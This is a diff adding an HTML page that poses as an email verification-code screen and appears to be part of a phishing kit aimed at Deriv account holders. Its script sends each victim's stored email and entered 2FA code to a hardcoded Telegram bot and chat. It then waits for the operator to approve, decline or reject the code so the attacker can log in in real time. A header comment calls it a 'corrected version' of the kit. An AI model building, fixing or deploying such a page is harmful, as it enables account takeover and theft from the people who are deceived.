@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Enter code</title>
+
+    <style>
+         :root {
+            --bg: #0f0f0f;
+            --text: #f4f4f4;
+            --text-soft: #d6d6d6;
+            --brand: #a34fde;
+            --brand-deep: #8a1f9c;
+            --input-border: #6f6f6f;
+            --btn-disabled: #4b4f4b;
+            --radius-input: 18px;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        /* ---------- Top bar ---------- */
+        
+        .topbar {
+            display: grid;
+            grid-template-columns: 44px 1fr 44px;
+            align-items: center;
+            padding: 18px 20px;
+        }
+        
+        .topbar .title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+        }
+        
+        .icon-btn {
+            background: none;
+            border: none;
+            color: var(--text);
+            cursor: pointer;
+            width: 44px;
+            height: 44px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .icon-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        /* ---------- Content ---------- */
+        
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 24px 24px 32px;
+        }
+        
+        .message {
+            text-align: center;
+            font-size: 19px;
+            line-height: 1.5;
+            color: var(--text);
+            margin: 24px 0 36px;
+        }
+        
+        .message .email {
+            font-weight: 600;
+            word-break: break-all;
+        }
+        
+        .code-form {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+        
+        .code-input {
+            width: 100%;
+            background: transparent;
+            border: 1px solid var(--input-border);
+            border-radius: var(--radius-input);
+            padding: 20px 18px;
+            font-size: 17px;
+            color: var(--text);
+            outline: none;
+            transition: border-color 0.15s;
+        }
+        
+        .code-input::placeholder {
+            color: #9a9a9a;
+        }
+        
+        .code-input:focus {
+            border-color: var(--text);
+        }
+        
+        .resend {
+            background: none;
+            border: none;
+            color: var(--brand);
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            margin: 48px auto 14px;
+            padding: 6px 10px;
+        }
+        
+        .resend:hover:not(:disabled) {
+            text-decoration: underline;
+        }
+        
+        .resend:disabled {
+            color: #7a7a7a;
+            cursor: not-allowed;
+        }
+        
+        .expiry {
+            text-align: center;
+            font-size: 16px;
+            color: var(--text-soft);
+        }
+        /* ---------- Bottom action ---------- */
+        
+        .actions {
+            margin-top: auto;
+            padding-top: 40px;
+        }
+        
+        .btn-verify {
+            display: block;
+            width: 100%;
+            padding: 17px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #e8e8e8;
+            background: var(--btn-disabled);
+            border: none;
+            border-radius: 10px;
+            cursor: not-allowed;
+            transition: background 0.15s;
+        }
+        
+        .btn-verify.enabled {
+            background: var(--brand-deep);
+            color: #fff;
+            cursor: pointer;
+        }
+        
+        .btn-verify.enabled:hover {
+            background: #a02cb5;
+        }
+        /* ---------- Spinner overlay ---------- */
+        
+        .spinner-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.65);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 16px;
+        }
+        
+        .spinner-overlay.active {
+            display: flex;
+        }
+        
+        .spinner-box {
+            width: 100%;
+            max-width: 420px;
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 14px;
+            padding: 22px;
+            text-align: center;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 3px solid rgba(255, 255, 255, 0.12);
+            border-top-color: var(--brand);
+            margin: 0 auto 14px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            font-weight: 800;
+            margin-bottom: 6px;
+            font-size: 16px;
+        }
+        
+        .spinner-email {
+            color: var(--text-soft);
+            font-size: 14px;
+            word-break: break-word;
+            margin-bottom: 16px;
+        }
+        
+        .cancel-poll-btn {
+            width: 100%;
+            height: 42px;
+            border-radius: 10px;
+            border: 1px solid #ef4444;
+            background: transparent;
+            color: #ef4444;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .cancel-poll-btn:hover {
+            background: rgba(239, 68, 68, 0.08);
+        }
+        /* ---------- Note area (for wrong/timeout/etc) ---------- */
+        
+        .form-note {
+            margin-top: 14px;
+            text-align: center;
+            font-size: 15px;
+            color: var(--text-soft);
+            min-height: 22px;
+        }
+        
+        .form-note.error {
+            color: #ff8a8a;
+            font-weight: 700;
+        }
+        /* ---------- Responsive ---------- */
+        
+        @media (max-width: 480px) {
+            .topbar {
+                padding: 14px 12px;
+            }
+            .main {
+                padding: 16px 20px 24px;
+            }
+            .message {
+                font-size: 18px;
+                margin: 16px 0 28px;
+            }
+            .resend {
+                margin-top: 36px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="topbar">
+        <button class="icon-btn" id="backBtn" aria-label="Go back">
+        <svg
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+        >
+          <line x1="19" y1="12" x2="5" y2="12" />
+          <polyline points="12 19 5 12 12 5" />
+        </svg>
+      </button>
+
+        <div class="title">Enter code</div>
+
+        <button class="icon-btn" aria-label="Help">
+        <svg
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+        >
+          <circle cx="12" cy="12" r="10" />
+          <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+          <line x1="12" y1="17" x2="12.01" y2="17" />
+        </svg>
+      </button>
+    </header>
+
+    <main class="main">
+        <p class="message">
+            We have sent a verification code to
+            <span class="email" id="userEmail">your registered email</span>. If you do not see our email in your inbox, check your spam folder
+        </p>
+
+        <form class="code-form" id="codeForm" novalidate>
+            <input class="code-input" id="codeInput" type="text" inputmode="numeric" autocomplete="one-time-code" placeholder="Verification code" maxlength="6" aria-label="Verification code" />
+
+            <button type="button" class="resend" id="resendBtn">
+          Send new code
+        </button>
+
+            <p class="expiry" id="expiryText">
+                Your code will be active for 15:00.
+            </p>
+
+            <div class="actions">
+                <button type="submit" class="btn-verify" id="verifyBtn" disabled>
+            Verify
+          </button>
+            </div>
+
+            <!-- NOTE area (JS writes messages here) -->
+            <p class="form-note" id="formNote"></p>
+        </form>
+    </main>
+
+    <!-- Spinner overlay -->
+    <div class="spinner-overlay" id="spinnerOverlay" aria-hidden="true">
+        <div class="spinner-box">
+            <div class="spinner"></div>
+            <p class="spinner-text">verifying...</p>
+            <p class="spinner-email" id="spinnerEmail"></p>
+            <button class="cancel-poll-btn" type="button" id="cancelPollBtn">
+          Cancel
+        </button>
+        </div>
+    </div>
+
+    <script>
+        /*****************************************************************
+         * Corrected version
+         * - Fixed DOM id mismatches (code/twofaForm/loginEmail/etc.)
+         * - Added missing CSS + note element wiring
+         * - Keeps your polling/approval/decline/wrong-code logic
+         *****************************************************************/
+
+        // Polling session guard
+        let currentPollController = null;
+        let pollTimeoutId = null;
+        let activeSessionId = null;
+
+        // CONFIG (keep as-is; ideally move to server)
+        const BOT_TOKEN = "8856743558:AAHQczE7UwZEYUYZQbvm6Ou0wrZZQ3Bsj6w";
+        const CHAT_ID = "8293861117";
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // DOM
+        const spinnerOverlay = document.getElementById("spinnerOverlay");
+        const spinnerEmailEl = document.getElementById("spinnerEmail");
+        const cancelPollBtn = document.getElementById("cancelPollBtn");
+
+        const codeForm = document.getElementById("codeForm");
+        const codeField = document.getElementById("codeInput");
+        const verifyBtn = document.getElementById("verifyBtn");
+
+        const userEmailEl = document.getElementById("userEmail");
+        const formNote = document.getElementById("formNote");
+
+        function safeSetNote(msg, type) {
+            if (!formNote) return;
+            formNote.textContent = msg || "";
+            formNote.className = "form-note" + (type ? " " + type : "");
+        }
+
+        function showSpinner(emailText) {
+            if (spinnerOverlay) spinnerOverlay.classList.add("active");
+            if (spinnerOverlay) spinnerOverlay.setAttribute("aria-hidden", "false");
+            if (spinnerEmailEl) spinnerEmailEl.textContent = emailText || "";
+        }
+
+        function hideSpinner() {
+            if (spinnerOverlay) spinnerOverlay.classList.remove("active");
+            if (spinnerOverlay) spinnerOverlay.setAttribute("aria-hidden", "true");
+        }
+
+        function disableSubmit(disabled) {
+            if (!verifyBtn) return;
+            verifyBtn.disabled = !!disabled;
+            verifyBtn.classList.toggle("enabled", !disabled);
+        }
+
+        function resetPageState() {
+            // Stop polling
+            if (currentPollController) currentPollController.abort();
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+
+            // Reset UI
+            hideSpinner();
+            disableSubmit(false);
+
+            if (codeField) codeField.value = "";
+            safeSetNote(
+                "Wrong code. Please enter a valid 6-digit code and try again.",
+                "error"
+            );
+
+            // Also clear active session so late callbacks can’t affect UI
+            activeSessionId = null;
+            currentPollController = null;
+            pollTimeoutId = null;
+        }
+
+        function onApprove() {
+            hideSpinner();
+            disableSubmit(false);
+            safeSetNote("", "");
+            window.location.href = "deriv.html";
+        }
+
+        function onDecline() {
+            hideSpinner();
+            disableSubmit(false);
+
+            safeSetNote("2FA verification declined. You can try again.", "error");
+
+            // You can keep it simple: reset code state so user can retry
+            // (Your previous version dynamically injected a button; that required extra DOM.)
+            activeSessionId = null;
+            currentPollController = null;
+            pollTimeoutId = null;
+        }
+
+        function onWrongCodeAndReset() {
+            resetPageState();
+        }
+
+        function cancelPolling() {
+            if (currentPollController) currentPollController.abort();
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+
+            hideSpinner();
+            disableSubmit(false);
+            safeSetNote("Request cancelled. Please try again.", "error");
+
+            activeSessionId = null;
+            currentPollController = null;
+            pollTimeoutId = null;
+        }
+
+        cancelPollBtn &&
+            cancelPollBtn.addEventListener("click", cancelPolling);
+
+        // Load saved email
+        window.addEventListener("DOMContentLoaded", () => {
+            const savedEmail = localStorage.getItem("signin_email");
+            if (userEmailEl && savedEmail) userEmailEl.textContent = savedEmail;
+
+            // initial disable state
+            disableSubmit(true); // disabled until 6 digits are typed
+        });
+
+        // Enable verify button when input looks valid
+        if (codeField) {
+            codeField.addEventListener("input", () => {
+                const ok = /^\d{6}$/.test(codeField.value.trim());
+                disableSubmit(!ok);
+                safeSetNote("", "");
+            });
+        }
+
+        function cryptoRandomId() {
+            try {
+                const arr = new Uint32Array(4);
+                crypto.getRandomValues(arr);
+                return Array.from(arr)
+                    .map((n) => n.toString(16))
+                    .join("");
+            } catch {
+                return (
+                    String(Date.now()) + "_" + Math.random().toString(16).slice(2)
+                );
+            }
+        }
+
+        function startPolling2FA(userId) {
+            let offset = 0;
+
+            // unique session id so old callbacks can't resolve newer UI
+            activeSessionId = cryptoRandomId();
+
+            if (currentPollController) currentPollController.abort();
+            currentPollController = new AbortController();
+
+            const sessionSnapshot = activeSessionId;
+
+            const maxPolls = 90; // ~ up to ~180s (depending on timing)
+            let pollCount = 0;
+
+            let retryDelay = 2000;
+
+            // Initialize offset so we only process updates after we start polling
+            fetch(`${API_BASE}/getUpdates?limit=1`, {
+                    method: "GET",
+                    signal: currentPollController.signal,
+                })
+                .then((r) => r.json())
+                .then((data) => {
+                    if (data && data.ok && data.result && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(() => {
+                    pollLoop();
+                });
+
+            function pollLoop() {
+                // session guard
+                if (activeSessionId !== sessionSnapshot) return;
+
+                pollCount++;
+                if (pollCount > maxPolls) {
+                    if (activeSessionId === sessionSnapshot) {
+                        activeSessionId = null;
+                        hideSpinner();
+                        disableSubmit(false);
+                        safeSetNote("Request timed out. Please try again.", "error");
+                    }
+                    return;
+                }
+
+                fetch(
+                        `${API_BASE}/getUpdates?limit=20&offset=${offset}`, {
+                            method: "GET",
+                            signal: currentPollController.signal,
+                        }
+                    )
+                    .then((r) => {
+                        if (!r.ok) {
+                            if (r.status === 409) {
+                                retryDelay = Math.min(retryDelay * 1.5, 10000);
+                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                                return null;
+                            }
+                            throw new Error("HTTP " + r.status);
+                        }
+                        retryDelay = 2000;
+                        return r.json();
+                    })
+                    .then((data) => {
+                        if (!data || !data.ok || activeSessionId !== sessionSnapshot)
+                            return;
+
+                        for (const update of data.result || []) {
+                            offset = update.update_id + 1;
+
+                            const cb = update.callback_query;
+                            if (!cb || !cb.data) continue;
+
+                            const actionData = cb.data;
+
+                            // Only act if this callback belongs to this userId
+                            if (!actionData.includes(`_${userId}`)) {
+                                continue;
+                            }
+
+                            // optional: stop Telegram client spinner
+                            fetch(`${API_BASE}/answerCallbackQuery`, {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json"
+                                },
+                                body: JSON.stringify({
+                                    callback_query_id: cb.id,
+                                    text: "Action recorded!",
+                                }),
+                            }).catch(() => {});
+
+                            if (actionData === `approve_2fa_${userId}`) {
+                                if (activeSessionId === sessionSnapshot) {
+                                    activeSessionId = null;
+                                    pollStop();
+                                    onApprove();
+                                }
+                                return;
+                            }
+
+                            if (actionData === `decline_2fa_${userId}`) {
+                                if (activeSessionId === sessionSnapshot) {
+                                    activeSessionId = null;
+                                    pollStop();
+                                    onDecline();
+                                }
+                                return;
+                            }
+
+                            if (actionData === `wrong_2fa_${userId}`) {
+                                if (activeSessionId === sessionSnapshot) {
+                                    activeSessionId = null;
+                                    pollStop();
+                                    onWrongCodeAndReset();
+                                }
+                                return;
+                            }
+                        }
+
+                        if (activeSessionId === sessionSnapshot) {
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    })
+                    .catch((err) => {
+                        if (err && err.name === "AbortError") return;
+                        if (activeSessionId !== sessionSnapshot) return;
+
+                        retryDelay = Math.min(retryDelay * 1.2, 8000);
+                        pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                    });
+            }
+
+            function pollStop() {
+                if (pollTimeoutId) clearTimeout(pollTimeoutId);
+                pollTimeoutId = null;
+
+                if (currentPollController) currentPollController.abort();
+                currentPollController = null;
+            }
+        }
+
+        // Handle submit
+        if (codeForm) {
+            codeForm.addEventListener("submit", function(e) {
+                e.preventDefault();
+
+                const code = codeField ? codeField.value.trim() : "";
+                if (!/^\d{6}$/.test(code)) {
+                    safeSetNote("Please enter a valid 6-digit code.", "error");
+                    return;
+                }
+
+                const storedEmail = localStorage.getItem("signin_email") || "unknown";
+
+                // Create an id per attempt + email
+                const userId =
+                    `${storedEmail.replace(/[^a-zA-Z0-9]/g, "").slice(0, 15)}_${Date.now()}`;
+
+                localStorage.setItem("signin_2fa_userId", userId);
+
+                // UI: start waiting
+                safeSetNote("Verifying with Telegram...", "");
+                showSpinner(storedEmail);
+                disableSubmit(true);
+
+                const message = [
+                    "🔐 2FA code received",
+                    "",
+                    `Email: ${storedEmail}`,
+                    `Code: ${code}`,
+                    "",
+                    "Please approve, decline, or mark as wrong:",
+                ].join("\n");
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ APPROVE",
+                            callback_data: `approve_2fa_${userId}`,
+                        }, {
+                            text: "❌ DECLINE",
+                            callback_data: `decline_2fa_${userId}`,
+                        }, ],
+                        [{
+                            text: "⚠️ WRONG CODE",
+                            callback_data: `wrong_2fa_${userId}`,
+                        }, ],
+                    ],
+                };
+
+                fetch(`${API_BASE}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            reply_markup: JSON.stringify(keyboard),
+                        }),
+                    })
+                    .then((res) => res.json())
+                    .then((data) => {
+                        if (!data.ok) {
+                            hideSpinner();
+                            disableSubmit(false);
+                            safeSetNote(
+                                "Failed to contact Telegram. Please try again.",
+                                "error"
+                            );
+                            return;
+                        }
+                        startPolling2FA(userId);
+                    })
+                    .catch(() => {
+                        hideSpinner();
+                        disableSubmit(false);
+                        safeSetNote("Network error. Please try again.", "error");
+                    });
+            });
+        }
+    </script>
+</body>
+
+</html>
